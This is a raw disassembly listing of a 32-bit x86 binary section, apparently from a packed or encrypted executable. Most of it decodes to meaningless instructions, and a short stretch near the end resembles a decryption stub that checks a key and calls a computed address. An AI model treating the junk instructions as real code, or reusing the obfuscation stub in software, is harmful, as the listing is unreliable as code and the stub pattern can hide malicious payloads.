  40da1b:	xchg   ebx,eax
  40da1c:	rcr    BYTE PTR [esi+0xe],cl
  40da1f:	add    ah,BYTE PTR [esi-0x53]
  40da22:	cmp    al,0x26
  40da24:	aam    0x67
  40da26:	shr    DWORD PTR [ebp-0x6e],0x18
  40da2a:	xor    BYTE PTR [ebx],bh
  40da2c:	cdq    
  40da2d:	sub    eax,DWORD PTR [edx+0x45]
  40da30:	neg    esp
  40da32:	jbe    0x40d9fe
  40da34:	(bad)  
  40da35:	jb     0x40da57
  40da37:	jns    0x40da99
  40da39:	pop    esi
  40da3a:	adc    BYTE PTR [ebx-0x30c4d7df],dh
  40da40:	rcl    dl,0x83
  40da43:	add    esi,DWORD PTR [esi]
  40da45:	int3   
  40da46:	dec    eax
  40da47:	or     DWORD PTR [ebx+0x71],edx
  40da4a:	mov    ds:0xc148f173,eax
  40da4f:	(bad)  
  40da50:	aad    0xc2
  40da52:	inc    eax
  40da53:	mov    esp,DWORD PTR ds:0x16f198a5
  40da59:	call   0x7b0eb767
  40da5e:	sub    BYTE PTR [eax],cl
  40da60:	es call 0xcd2e:0x89230e93
  40da68:	imul   esp,DWORD PTR [ebp+0x30],0xe
  40da6c:	bound  ebp,QWORD PTR [esp+eax*2+0x1fc029fd]
  40da73:	xchg   ecx,eax
  40da74:	int    0x30
  40da76:	out    0x90,al
  40da78:	jge    0x40daa9
  40da7a:	mov    bh,0xa7
  40da7c:	loopne 0x40da48
  40da7e:	clc    
  40da7f:	sar    BYTE PTR [edi-0x50],0xef
  40da83:	xor    eax,0x3338b584
  40da88:	add    edx,ebp
  40da8a:	mov    ds:0x65be543e,al
  40da8f:	and    DWORD PTR [edi-0x34],esi
  40da92:	mov    cl,0x34
  40da94:	pop    ax
  40da96:	jbe    0x40dac2
  40da98:	stos   BYTE PTR es:[edi],al
  40da99:	out    0x1e,al
  40da9b:	mov    DWORD PTR [ebp+0x19b5933f],edi
  40daa1:	in     eax,0xca
  40daa3:	ja     0x40daa6
  40daa5:	fistp  DWORD PTR [eax+0x52]
  40daa8:	neg    edx
  40daaa:	mov    esi,0x562932ba
  40daaf:	jl     0x40db27
  40dab1:	and    ah,BYTE PTR [ecx]
  40dab3:	add    DWORD PTR [ebx+eax*1],edi
  40dab6:	outs   dx,DWORD PTR ds:[esi]
  40dab7:	push   edi
  40dab8:	xchg   DWORD PTR [ebx-0x6],ebx
  40dabb:	sub    DWORD PTR [edi-0x8],ebp
  40dabe:	dec    ebx
  40dabf:	cmp    eax,DWORD PTR [ebp+0x9]
  40dac2:	fdivr  st,st(7)
  40dac4:	or     al,0xad
  40dac6:	mov    esp,0xaad33ea8
  40dacb:	cmp    BYTE PTR [esi],ah
  40dacd:	iret   
  40dace:	push   ss
  40dacf:	ss mov bl,0xc6
  40dad2:	xchg   esp,eax
  40dad3:	sbb    dh,BYTE PTR [edi-0x381a0ada]
  40dad9:	add    eax,0xa11b8a1e
  40dade:	jne    0x40da67
  40dae0:	mov    ebx,0xcaf2885f
  40dae5:	push   ebp
  40dae6:	sti    
  40dae7:	inc    ecx
  40dae8:	ss jno 0x40db68
  40daeb:	dec    esi
  40daec:	and    ch,cl
  40daee:	outs   dx,BYTE PTR ds:[esi]
  40daef:	jmp    0x40da97
  40daf1:	imul   esi,DWORD PTR [ebx],0x8f553445
  40daf7:	mov    eax,ds:0x5fc30052
  40dafc:	mov    ch,0xeb
  40dafe:	or     DWORD PTR [edi+eax*1-0x3d4e4277],esp
  40db05:	mov    ds:0x631896e4,al
  40db0a:	pop    ds
  40db0b:	aam    0x96
  40db0d:	and    bl,bl
  40db0f:	bswap  ebp
  40db11:	bound  eax,QWORD PTR [eax-0x377f2f5c]
  40db17:	retf   0xfc3a
  40db1a:	dec    ebp
  40db1b:	pop    esi
  40db1c:	xor    BYTE PTR [ebx+0x72],0xa9
  40db20:	aam    0xc1
  40db22:	pop    eax
  40db23:	and    al,0xf
  40db25:	arpl   WORD PTR [eax],di
  40db27:	nop
  40db28:	int    0xc0
  40db2a:	std    
  40db2b:	stos   DWORD PTR es:[edi],eax
  40db2c:	jp     0x40db60
  40db2e:	ret    
  40db2f:	or     al,0x5c
  40db31:	stos   DWORD PTR es:[edi],eax
  40db32:	sub    DWORD PTR [ebx+0x39],eax
  40db35:	push   ss
  40db36:	sbb    ah,ah
  40db38:	add    ebp,DWORD PTR [ebx-0x48]
  40db3b:	dec    ebp
  40db3c:	and    DWORD PTR [edi+eax*1],edi
  40db3f:	push   0xffffffbf
  40db41:	push   ebx
  40db42:	sub    bl,dh
  40db44:	int    0x7b
  40db46:	and    al,0xeb
  40db48:	out    0xbb,eax
  40db4a:	xchg   esp,eax
  40db4b:	jecxz  0x40db66
  40db4d:	cmp    DWORD PTR [edi+0xe7c2726],edi
  40db53:	adc    ebx,DWORD PTR [edi+0x8]
  40db56:	mov    dh,0xdc
  40db58:	retf   
  40db59:	jno    0x40db15
  40db5b:	mov    ebx,eax
  40db5d:	adc    ebp,ebp
  40db5f:	sub    eax,0x142e4b08
  40db64:	sbb    eax,0x13ae5204
  40db69:	sar    cl,cl
  40db6b:	sub    ch,cl
  40db6d:	mov    ebx,0x8fea92a6
  40db72:	jne    0x40dbd9
  40db74:	es push es
  40db76:	loopne 0x40dbd7
  40db78:	stos   BYTE PTR es:[edi],al
  40db79:	dec    edi
  40db7a:	sub    ebp,0x37633ef2
  40db80:	or     eax,DWORD PTR [edi+0x62]
  40db83:	jmp    0x5e7b:0x1b6de570
  40db8a:	gs (bad) 
  40db8c:	pop    esp
  40db8d:	sub    BYTE PTR [ebp+0xa],al
  40db90:	(bad)  
  40db91:	shl    BYTE PTR [ebp*8-0x3da8d6f7],1
  40db98:	mov    ds:0x2946515b,eax
  40db9d:	rcl    DWORD PTR [edx],0x21
  40dba0:	ins    BYTE PTR es:[edi],dx
  40dba1:	lds    esi,FWORD PTR [ecx+0x6ad09728]
  40dba7:	and    DWORD PTR [edi+0x65f5ab6],ebp
  40dbad:	mov    ch,0x57
  40dbaf:	mov    al,ds:0xf19315ea
  40dbb4:	mov    esp,0x417881b8
  40dbb9:	sti    
  40dbba:	aaa    
  40dbbb:	push   esp
  40dbbc:	mov    ah,0x68
  40dbbe:	cmp    al,0x4d
  40dbc0:	jg     0x40db6e
  40dbc2:	je     0x40dbc7
  40dbc4:	mov    esi,0x7a888658
  40dbc9:	shr    edx,0xba
  40dbcc:	lods   al,BYTE PTR ds:[esi]
  40dbcd:	out    dx,al
  40dbce:	mov    dl,al
  40dbd0:	mov    esi,0xac1781a7
  40dbd5:	ret    0x3b96
  40dbd8:	repnz fs sub eax,ebp
  40dbdc:	add    esp,edi
  40dbde:	push   ecx
  40dbdf:	push   esp
  40dbe0:	push   0xdcf6fa80
  40dbe5:	mov    ch,0x4f
  40dbe7:	adc    bl,dl
  40dbe9:	das    
  40dbea:	and    DWORD PTR [esi],ebp
  40dbec:	fisttp WORD PTR [edx]
  40dbee:	push   cs
  40dbef:	adc    BYTE PTR ds:0xeeb5d22f,dh
  40dbf5:	lea    ecx,es:0xaaf2d85a
  40dbfc:	div    DWORD PTR [ecx+0x3e324cf6]
  40dc02:	push   ecx
  40dc03:	adc    ch,BYTE PTR [ebp-0x313713a2]
  40dc09:	fcmovne st,st(0)
  40dc0b:	ins    DWORD PTR es:[edi],dx
  40dc0c:	hlt    
  40dc0d:	(bad)  
  40dc0e:	xor    esp,esp
  40dc10:	pop    esp
  40dc11:	mov    edx,0x355ae346
  40dc16:	inc    edx
  40dc17:	outs   dx,DWORD PTR fs:[esi]
  40dc19:	mov    esi,0xbe8076fe
  40dc1e:	pushw  ss
  40dc20:	jl     0x40dc00
  40dc22:	pop    esp
  40dc23:	xchg   BYTE PTR [eax+0x1f],ah
  40dc26:	dec    ecx
  40dc27:	mov    esp,0xc4b57388
  40dc2c:	mov    ah,0x16
  40dc2e:	outs   dx,DWORD PTR ds:[esi]
  40dc2f:	nop
  40dc30:	mov    eax,0x5a924979
  40dc35:	dec    ebp
  40dc36:	cmp    al,0x95
  40dc38:	retf   
  40dc39:	and    DWORD PTR [esi],ebp
  40dc3b:	shr    BYTE PTR ds:0x25d43e72,1
  40dc41:	and    bh,0x38
  40dc44:	(bad)  
  40dc46:	std    
  40dc47:	repnz aas 
  40dc49:	retf   
  40dc4a:	xchg   edi,eax
  40dc4b:	sbb    BYTE PTR [eax-0x1f],dh
  40dc4e:	push   ecx
  40dc4f:	xor    ebx,esi
  40dc51:	jns    0x40dbd8
  40dc53:	repnz outs dx,DWORD PTR ds:[esi]
  40dc55:	cdq    
  40dc56:	mov    ebx,0x9bd0fc0f
  40dc5b:	sbb    BYTE PTR ds:0x63f45f98,0xf0
  40dc62:	ret    
  40dc63:	mov    ecx,0x8b08558b
  40dc68:	jge    0x40dc46
  40dc6a:	jmp    0x40df8a
  40dc6f:	repnz cmp al,0x15
  40dc72:	adc    al,0x31
  40dc74:	aad    0xf3
  40dc76:	fcom   DWORD PTR [eax*8-0x49433768]
  40dc7d:	adc    eax,0x7e9a35d9
  40dc82:	jle    0x40dd01
  40dc84:	jge    0x40dd04
  40dc86:	jle    0x40dccc
  40dc88:	pop    eax
  40dc89:	imul   eax,DWORD PTR [ebp+0x6a],0x24906ce7
  40dc90:	loopne 0x40dce9
  40dc92:	xor    ch,0x24
  40dc95:	push   esp
  40dc96:	jmp    0x351fdbfd
  40dc9b:	icebp  
  40dc9c:	xchg   edi,eax
  40dc9d:	adc    al,0x24
  40dc9f:	mov    bl,0x12
  40dca1:	cli    
  40dca2:	dec    esp
  40dca3:	fistp  WORD PTR [eax+0x34]
  40dca6:	call   0xb068d5b5
  40dcab:	shr    edi,1
  40dcad:	js     0x40dc4d
  40dcaf:	sti    
  40dcb0:	(bad)  
  40dcb1:	call   0x6d39c40b
  40dcb6:	scas   al,BYTE PTR es:[edi]
  40dcb7:	cmp    DWORD PTR [esp+eax*8+0x57a218f4],edx
  40dcbe:	or     DWORD PTR [edx-0x8],0x44
  40dcc2:	xchg   BYTE PTR [eax+ebp*8-0x39],al
  40dcc6:	jnp    0x40dd39
  40dcc8:	mov    dl,0x88
  40dcca:	mov    ecx,0x8adf3c6f
  40dccf:	xor    ch,0x81
  40dcd2:	xchg   esi,eax
  40dcd3:	mov    ah,BYTE PTR [ecx]
  40dcd5:	push   ebp
  40dcd6:	sub    DWORD PTR [edx-0x5c],esi
  40dcd9:	xchg   ecx,eax
  40dcda:	imul   ecx,DWORD PTR [eax-0x6af751f1],0xfffffffe
  40dce1:	leave  
  40dce2:	push   esi
  40dce3:	mov    ss,WORD PTR [esi-0x374cffa9]
  40dce9:	cli    
  40dcea:	xchg   edx,eax
  40dceb:	sub    eax,0x2d0066bd
  40dcf0:	lea    ecx,[esp+edx*2]
  40dcf3:	pusha  
  40dcf4:	mov    WORD PTR [eax-0x6d],ss
  40dcf7:	mov    DWORD PTR [eax+0x74],esp
  40dcfa:	ja     0x40dcea
  40dcfc:	jmp    0xb47951ec
  40dd01:	mov    al,0xa0
  40dd03:	sub    eax,0xae7ab4f0
  40dd08:	(bad)  
  40dd09:	jmp    0x4de4f5a2
  40dd0e:	jbe    0x40dca3
  40dd10:	pop    esi
  40dd11:	inc    ebx
  40dd12:	cmp    DWORD PTR [edx],ebx
  40dd14:	aas    
  40dd15:	popf   
  40dd16:	test   al,0x9e
  40dd18:	test   al,0x1
  40dd1a:	mov    edi,0x8d797a72
  40dd1f:	test   al,0x4e
  40dd21:	fmul   QWORD PTR [edx-0x40]
  40dd24:	out    dx,eax
  40dd25:	arpl   WORD PTR [edi+0x32a2d30a],si
  40dd2b:	stos   BYTE PTR es:[edi],al
  40dd2c:	cmp    eax,0x38dafd56
  40dd31:	xchg   ebx,eax
  40dd32:	add    DWORD PTR [edx-0x2b],ebx
  40dd35:	loop   0x40dd41
  40dd37:	aaa    
  40dd38:	arpl   sp,bp
  40dd3a:	sbb    al,0x4d
  40dd3c:	hlt    
  40dd3d:	stos   BYTE PTR es:[edi],al
  40dd3e:	dec    edx
  40dd3f:	or     DWORD PTR [esi+0x597e263e],esi
  40dd45:	jge    0x40dd40
  40dd47:	cmp    BYTE PTR [eax+edx*8],dl
  40dd4a:	mov    ebx,DWORD PTR [ecx+0x58]
  40dd4d:	mov    es,ebx
  40dd4f:	mov    dh,0xd0
  40dd51:	jecxz  0x40dcf2
  40dd53:	stos   DWORD PTR es:[edi],eax
  40dd54:	add    dl,dl
  40dd56:	xor    eax,edi
  40dd58:	sub    esi,ebp
  40dd5a:	cmp    DWORD PTR [ecx+0x5bd6c40b],ecx
  40dd60:	leave  
  40dd61:	in     eax,dx
  40dd62:	(bad)  
  40dd63:	or     ebx,DWORD PTR [eax]
  40dd65:	or     ebx,DWORD PTR [edx]
  40dd67:	scas   al,BYTE PTR es:[edi]
  40dd68:	pop    edi
  40dd69:	lahf   
  40dd6a:	retf   
  40dd6b:	aam    0x6d
  40dd6d:	add    al,0x3
  40dd6f:	mov    BYTE PTR [edi-0x39],ah
  40dd72:	push   ecx
  40dd73:	(bad)  
  40dd74:	push   ecx
  40dd75:	jmp    0x28e6bc53
  40dd7a:	loope  0x40dd81
  40dd7c:	push   cs
  40dd7d:	loopne 0x40dd06
  40dd7f:	dec    ebp
  40dd80:	jb     0x40ddea
  40dd82:	retf   
  40dd83:	cld    
  40dd84:	cs arpl si,ax
  40dd87:	jge    0x40dd95
  40dd89:	push   ecx
  40dd8a:	adc    ah,BYTE PTR ds:0x8397426c
  40dd90:	mov    gs,WORD PTR ds:0x1b8fcc1a
  40dd96:	rcr    DWORD PTR [ebx+ebp*1-0x7c],1
  40dd9a:	gs jo  0x40dd5d
  40dd9d:	dec    esi
  40dd9e:	pop    edx
  40dd9f:	xchg   esi,eax
  40dda0:	adc    al,0x1b
  40dda2:	fimul  DWORD PTR [edx]
  40dda4:	rcr    edx,0x43
  40dda7:	fidivr WORD PTR [eax+0x408e7575]
  40ddad:	mov    esi,DWORD PTR [ebx]
  40ddaf:	xchg   ecx,eax
  40ddb0:	or     al,0x41
  40ddb2:	je     0x40dda8
  40ddb4:	in     eax,0x18
  40ddb6:	push   ecx
  40ddb7:	push   0x787cd79f
  40ddbc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ddbd:	push   edx
  40ddbe:	cmp    esi,DWORD PTR [ecx+0x405df64e]
  40ddc4:	or     BYTE PTR [eax],ch
  40ddc6:	out    dx,al
  40ddc7:	mov    bl,BYTE PTR [edi]
  40ddc9:	push   ebp
  40ddca:	into   
  40ddcb:	ret    
  40ddcc:	ins    BYTE PTR es:[edi],dx
  40ddcd:	mov    al,ds:0x9d539194
  40ddd2:	fcmovne st,st(5)
  40ddd4:	or     al,0x98
  40ddd6:	ins    BYTE PTR es:[edi],dx
  40ddd7:	or     edi,DWORD PTR [ebp-0x61d0a7d9]
  40dddd:	fwait
  40ddde:	pusha  
  40dddf:	jge    0x40de06
  40dde1:	and    esp,DWORD PTR [ecx+0x42c0668]
  40dde7:	dec    eax
  40dde8:	je     0x40dda1
  40ddea:	or     DWORD PTR [edx-0x2b],edi
  40dded:	adc    eax,DWORD PTR [eax+0x5baa785e]
  40ddf3:	adc    DWORD PTR [edi],ecx
  40ddf5:	enter  0xbeb2,0x8d
  40ddf9:	jge    0x40dd8f
  40ddfb:	jg     0x40dde6
  40ddfd:	or     DWORD PTR [eax],esi
  40ddff:	push   ecx
  40de00:	inc    DWORD PTR [ecx-0x2f079de1]
  40de06:	stc    
  40de07:	and    al,0x9a
  40de09:	addr16 jne 0x40ddb6
  40de0c:	fnsave [edx+edi*8]
  40de0f:	jg     0x40de3f
  40de11:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40de12:	je     0x40de51
  40de14:	bound  ecx,QWORD PTR [ebx]
  40de16:	dec    esi
  40de17:	(bad)
  40de1a:	sub    DWORD PTR [eax-0x19],0xffffffa7
  40de1e:	repnz fcomp DWORD PTR [ebp+ecx*8+0x6710d805]
  40de26:	cwde   
  40de27:	pop    ebx
  40de28:	in     eax,0xbd
  40de2a:	mov    edi,0x59982c02
  40de2f:	xchg   dl,bh
  40de31:	mov    esp,0xaba51976
  40de36:	fwait
  40de37:	mov    al,0x47
  40de39:	mov    al,cl
  40de3b:	in     al,dx
  40de3c:	cmp    dl,BYTE PTR [ecx+0x492e4432]
  40de42:	jmp    0x1af72e95
  40de47:	rcl    ch,cl
  40de49:	ds mov es,ebp
  40de4c:	enter  0xe610,0x92
  40de50:	(bad)  
  40de51:	aaa    
  40de52:	mov    edi,0x73e6fede
  40de57:	pop    edi
  40de58:	push   ebp
  40de59:	pushf  
  40de5a:	das    
  40de5b:	fisubr WORD PTR [ecx+edx*1-0x33]
  40de5f:	shr    ch,cl
  40de61:	repnz cdq 
  40de63:	adc    eax,0x1cf53a0e
  40de68:	adc    bh,BYTE PTR ds:0x49d4989e
  40de6e:	stos   DWORD PTR es:[edi],eax
  40de6f:	(bad)  
  40de70:	sub    BYTE PTR [eax],ah
  40de72:	pop    eax
  40de73:	scas   al,BYTE PTR es:[edi]
  40de74:	sub    DWORD PTR fs:0x9453ebf4,0xa4f68c92
  40de7f:	xchg   esp,esi
  40de81:	pop    es
  40de82:	push   cs
  40de83:	mov    dl,0x4f
  40de85:	pop    ecx
  40de86:	jbe    0x40de9e
  40de88:	xor    al,0xee
  40de8a:	xor    DWORD PTR ds:0x586f9a4,eax
  40de90:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40de91:	test   cl,dh
  40de93:	nop
  40de94:	xor    ebp,DWORD PTR [ebx]
  40de96:	sbb    DWORD PTR [edi],0xa0e099e9
  40de9c:	pop    ds
  40de9d:	int    0x3d
  40de9f:	ss xchg ecx,eax
  40dea1:	push   ebx
  40dea2:	into   
  40dea3:	cli    
  40dea4:	icebp  
  40dea5:	jecxz  0x40deeb
  40dea7:	dec    eax
  40dea8:	mov    eax,0xdbacea82
  40dead:	gs jnp 0x40df28
  40deb0:	mov    edi,0xf583f426
  40deb5:	and    eax,0x5e3b0774
  40deba:	in     al,dx
  40debb:	iret   
  40debc:	pushf  
  40debd:	les    esi,FWORD PTR [ebp-0x35]
  40dec0:	adc    al,0x93
  40dec2:	aas    
  40dec3:	stc    
  40dec4:	(bad)  
  40dec5:	mov    WORD PTR [ebp-0x2047e692],gs
  40decb:	sbb    esp,ebx
  40decd:	mov    ebx,0x5cd81a88
  40ded2:	jae    0x40df13
  40ded4:	xchg   dh,ch
  40ded6:	(bad)  
  40ded7:	mov    esi,0xca34a3ee
  40dedc:	xchg   edi,eax
  40dedd:	sbb    ebp,0xb749ef7c
  40dee3:	cld    
  40dee4:	xor    BYTE PTR [eax],0x58
  40dee7:	lea    ebx,[ebx+0x2b]
  40deea:	and    al,BYTE PTR [ebx]
  40deec:	outs   dx,BYTE PTR ds:[esi]
  40deed:	fwait
  40deee:	in     eax,dx
  40deef:	daa    
  40def0:	xor    esi,DWORD PTR [ecx]
  40def2:	mov    esi,0x7268e8c8
  40def7:	xor    eax,0x95d3a393
  40defc:	push   edx
  40defd:	push   edx
  40defe:	push   eax
  40deff:	and    DWORD PTR [esp+edx*8-0x2fff66bb],0xffffff9c
  40df07:	push   0x31
  40df09:	mov    ds:0x35790782,eax
  40df0e:	sti    
  40df0f:	pop    edx
  40df10:	cmp    eax,0xc687cd54
  40df15:	pop    esi
  40df16:	xor    DWORD PTR [ecx],esi
  40df18:	push   0x51498021
  40df1d:	xchg   esi,eax
  40df1e:	call   0x85739090
  40df23:	out    dx,eax
  40df24:	and    DWORD PTR [edi],ecx
  40df26:	in     al,0x8c
  40df28:	jb     0x40df7b
  40df2a:	and    eax,0x11b996fc
  40df2f:	pop    ebx
  40df30:	pop    ds
  40df31:	inc    ecx
  40df32:	mov    cl,0xa4
  40df34:	daa    
  40df35:	jae    0x40df32
  40df37:	or     eax,DWORD PTR [ecx-0x136c4d66]
  40df3d:	mov    eax,0xa8c6c81f
  40df42:	(bad)  
  40df43:	xor    al,dh
  40df45:	dec    esi
  40df46:	addr16 jp 0x40df14
  40df49:	in     eax,dx
  40df4a:	add    al,0x1a
  40df4c:	push   eax
  40df4d:	sub    eax,DWORD PTR [ebx-0x6b]
  40df50:	pop    edx
  40df51:	mov    bl,0xd2
  40df53:	pushf  
  40df54:	cmp    eax,0xf222c6fd
  40df59:	inc    ebx
  40df5a:	sub    eax,0x27baee71
  40df5f:	adc    ebx,ebx
  40df61:	pop    ds
  40df62:	es cli 
  40df64:	mov    edi,0x80e0fbff
  40df69:	stos   DWORD PTR es:[edi],eax
  40df6a:	jl     0x40df7d
  40df6c:	mov    esi,0x70922a94
  40df71:	test   eax,0xf66b7e44
  40df76:	jle    0x40df43
  40df78:	xchg   esp,eax
  40df79:	pop    ss
  40df7a:	push   esp
  40df7b:	pop    eax
  40df7c:	dec    esi
  40df7d:	inc    esi
  40df7f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40df80:	cmp    eax,0x1eeb5e4a
  40df85:	sub    dl,dl
  40df87:	nop
  40df88:	stos   BYTE PTR es:[edi],al
  40df89:	sbb    ecx,DWORD PTR [ecx+0x458b9704]
  40df8f:	call   0x3349351f
  40df94:	ror    DWORD PTR [ebp+0x729b1084],0x32
  40df9b:	add    BYTE PTR [ecx+0x458b0845],cl
  40dfa1:	call   0x33553531
  40dfa6:	rol    DWORD PTR [ebx],0xc6
  40dfa9:	imul   eax,DWORD PTR [edx]
  40dfac:	mov    edx,DWORD PTR [ebp-0x4]
  40dfaf:	xor    edx,ecx
  40dfb1:	mov    ecx,DWORD PTR [ebp+0x8]
  40dfb4:	lea    ecx,[edx+ecx*1+0x32729b]
  40dfbb:	cmp    ecx,eax
  40dfbd:	jne    0x40d5f9
  40dfc3:	mov    ebx,esi
  40dfc5:	jmp    0x40dfcf
  40dfca:	mov    ebx,0x32729b
  40dfcf:	mov    eax,DWORD PTR [ebp-0x4]
  40dfd2:	xor    eax,0x7510854
  40dfd7:	add    eax,ebx
  40dfd9:	mov    DWORD PTR [ebp-0xc],eax
  40dfdc:	xor    ebx,ebx
  40dfde:	lea    eax,[ebp-0x10]
  40dfe1:	add    ebx,DWORD PTR [eax]
  40dfe3:	call   ebx
  40dfe5:	xor    ebx,ebx
  40dfe7:	inc    ebx
  40dfe8:	cmp    DWORD PTR [ebp+0x10],ebx
  40dfeb:	je     0x40e009
  40dff1:	xchg   edx,eax
  40dff2:	push   0xa
  40dff4:	pop    ecx
  40dff5:	push   0x4
  40dff7:	pop    ebx
  40dff8:	inc    ebx
  40dff9:	xchg   ebx,ecx
  40dffb:	sub    ebx,ecx
  40dffd:	xchg   ebx,ecx
  40dfff:	dec    ecx
  40e000:	mov    eax,DWORD PTR [ebp-0x1c]
  40e003:	imul   eax,ecx
  40e006:	add    esp,eax
  40e008:	xchg   edx,eax
  40e009:	push   eax
  40e00a:	xor    ebx,ebx
  40e00c:	mov    edx,esp
  40e00e:	dec    edx
  40e00f:	inc    ebx
  40e010:	add    ebx,DWORD PTR [edx+ebx*1]
  40e013:	jmp    0x40e333
  40e018:	lods   al,BYTE PTR ds:[esi]
  40e019:	and    bl,bl
  40e01b:	xchg   esp,eax
  40e01c:	jno    0x40e073
  40e01e:	jno    0x40e042
  40e020:	add    cl,cl
  40e022:	paddb  mm4,QWORD PTR cs:0x99305b2f
  40e02a:	jle    0x40e0aa
  40e02c:	jge    0x40e0ab
  40e02e:	jle    0x40e0ae
  40e030:	add    eax,0x9fbe3f7
  40e035:	test   DWORD PTR es:[edx+ebp*2+0x261d1976],edi
  40e03d:	cwde   
  40e03e:	jbe    0x40dff2
  40e040:	arpl   cx,si
  40e042:	enter  0x2ed1,0xc3
  40e046:	and    ah,cl
  40e048:	push   es
  40e049:	stc    
  40e04a:	daa    
  40e04b:	and    eax,0x9ba503d6
  40e050:	add    ecx,0x45
  40e053:	adc    al,0xc5
  40e055:	fnstenv [edi]
  40e057:	jle    0x40e061
  40e059:	push   0xffffff81
  40e05b:	add    BYTE PTR [edx],ch
  40e05d:	dec    eax
  40e05e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e05f:	push   eax
  40e060:	cwde   
  40e061:	cmp    al,0x3d
  40e063:	dec    eax
  40e064:	and    edi,DWORD PTR [esi-0x6c]
  40e067:	jns    0x40e0cb
  40e069:	sub    eax,0x8814f9
  40e06e:	jg     0x40e088
  40e070:	jmp    0xaac88b7
  40e075:	adc    edx,eax
  40e077:	dec    ebp
  40e078:	hlt    
  40e079:	dec    edx
  40e07a:	cmp    esi,DWORD PTR [ecx]
  40e07c:	inc    edx
  40e07d:	dec    ebx
  40e07e:	sbb    esi,DWORD PTR [eax-0x79913c41]
  40e084:	xor    eax,0x90fe09a8
  40e089:	jle    0x40e035
  40e08b:	sar    DWORD PTR [esi-0x41],cl
  40e08e:	cs (bad) 
  40e090:	xchg   edx,eax
  40e091:	stos   BYTE PTR es:[edi],al
  40e092:	ret    
  40e093:	mov    al,dh
  40e095:	and    ecx,DWORD PTR [eax+0x62]
  40e098:	sbb    BYTE PTR [ebp+esi*2+0x23],bl
  40e09c:	push   cs
  40e09d:	inc    esp
  40e09e:	ds inc edx
  40e0a0:	mov    bl,0x67
  40e0a2:	mov    BYTE PTR [esi+0x798392a7],ah
  40e0a8:	bound  esp,QWORD PTR [eax]
  40e0aa:	dec    ecx
  40e0ab:	test   al,0xf7
  40e0ad:	call   0x1473:0xe9b51a86
  40e0b4:	push   edi
  40e0b5:	cmc    
  40e0b6:	push   0x8e585604
  40e0bb:	add    bh,BYTE PTR [esi+eiz*8-0x5f9256c9]
  40e0c2:	dec    eax
  40e0c3:	push   edi
  40e0c4:	mov    bh,0x3a
  40e0c6:	jbe    0x40e08a
  40e0c8:	mov    ds:0x6965cef4,eax
  40e0cd:	nop
  40e0ce:	out    0x5d,al
  40e0d0:	mov    esi,0x6c6262b
  40e0d5:	dec    edi
  40e0d6:	add    edx,DWORD PTR [ebp-0x30]
  40e0d9:	pushf  
  40e0da:	mov    esi,0x8403000e
  40e0df:	xchg   edi,eax
  40e0e0:	xchg   ecx,eax
  40e0e1:	sub    BYTE PTR [ebx],cl
  40e0e3:	mov    DWORD PTR [ebx-0x631852ce],esp
  40e0e9:	pop    esi
  40e0ea:	inc    ecx
  40e0eb:	xchg   esi,eax
  40e0ec:	fidivr DWORD PTR [ecx+0x43]
  40e0ef:	shl    BYTE PTR [edi+0x6],0xda
  40e0f3:	and    eax,DWORD PTR ds:0x6675927b
  40e0f9:	add    BYTE PTR [edi],dh
  40e0fb:	dec    DWORD PTR ds:0x20b743
  40e101:	out    dx,eax
  40e102:	imul   ebx,DWORD PTR [edx-0x59],0x82635b46
  40e109:	xor    BYTE PTR [edi+0x3a9aee22],0xad
  40e110:	lea    edi,[edx-0x50]
  40e113:	daa    
  40e114:	ror    dh,cl
  40e116:	ja     0x40e14f
  40e118:	lock push eax
  40e11a:	hlt    
  40e11b:	(bad)  
  40e11c:	push   eax
  40e11d:	cmp    dh,BYTE PTR [ebx-0x26560fbd]
  40e123:	aaa    
  40e124:	dec    edi
  40e125:	repz and edx,DWORD PTR [ecx]
  40e128:	pop    edi
  40e129:	lds    eax,FWORD PTR [edi+ecx*2-0x6c18ff26]
  40e130:	icebp  
  40e131:	in     al,0xf0
  40e133:	cmp    BYTE PTR [ebp-0x1f],ah
  40e136:	inc    edi
  40e137:	dec    edx
  40e138:	dec    edi
  40e139:	and    DWORD PTR [ebx],edi
  40e13b:	fwait
  40e13c:	loopne 0x40e0ed
  40e13e:	aaa    
  40e13f:	cmp    eax,0xdf3f5128
  40e144:	add    ebx,DWORD PTR ds:0x3a14381b
  40e14a:	imul   ebp,eax,0x5eac5df9
  40e150:	jg     0x40e1ad
  40e152:	jnp    0x40e0e7
  40e154:	imul   DWORD PTR [ecx-0x6c87117b]
  40e15a:	sti    
  40e15b:	or     eax,0x9bf160e0
  40e160:	cld    
  40e161:	sar    DWORD PTR [ecx-0x2a9acd4c],cl
  40e167:	fisubr DWORD PTR [edx+ecx*8+0x17fd6a3c]
  40e16e:	xor    al,0xec
  40e170:	pop    esp
  40e171:	pop    ebp
  40e172:	mov    ah,0x1c
  40e174:	lock jno 0x40e140
  40e177:	test   eax,0x328ae033
  40e17c:	enter  0xed87,0x25
  40e180:	fld    TBYTE PTR gs:[esi+0x6a]
  40e184:	jo     0x40e1d8
  40e186:	repnz mov eax,ds:0xbe248698
  40e18c:	mov    BYTE PTR [edi-0x26d94709],cl
  40e192:	ret    0x4962
  40e195:	out    0x50,al
  40e197:	jne    0x40e120
  40e199:	push   ss
  40e19a:	call   0xd1ce0966
  40e19f:	cmc    
  40e1a0:	sub    BYTE PTR ds:0x3b93cc20,dl
  40e1a6:	lahf   
  40e1a7:	fidivr WORD PTR [edx-0x71e0b853]
  40e1ad:	sahf   
  40e1ae:	(bad)  
  40e1af:	and    DWORD PTR [ecx+0xf],ecx
  40e1b2:	daa    
  40e1b3:	adc    ebp,DWORD PTR [eax+0x16]
  40e1b6:	loope  0x40e14f
  40e1b8:	inc    ebp
  40e1b9:	jns    0x40e1bc
  40e1bb:	dec    esi
  40e1bc:	fldenv [ecx-0xc6634a]
  40e1c2:	out    0xce,al
  40e1c4:	sti    
  40e1c5:	enter  0x281f,0xbd
  40e1c9:	enter  0x1aa6,0xc
  40e1cd:	(bad)  
  40e1cf:	jecxz  0x40e23b
  40e1d1:	mov    ebp,0xa7664df1
  40e1d6:	int    0xb0
  40e1d8:	daa    
  40e1d9:	ins    BYTE PTR es:[edi],dx
  40e1da:	sbb    ah,BYTE PTR [esi-0x65]
  40e1dd:	sbb    ah,cl
  40e1df:	sar    eax,cl
  40e1e1:	(bad)  
  40e1e2:	(bad)  
  40e1e3:	ds mov ch,0x1
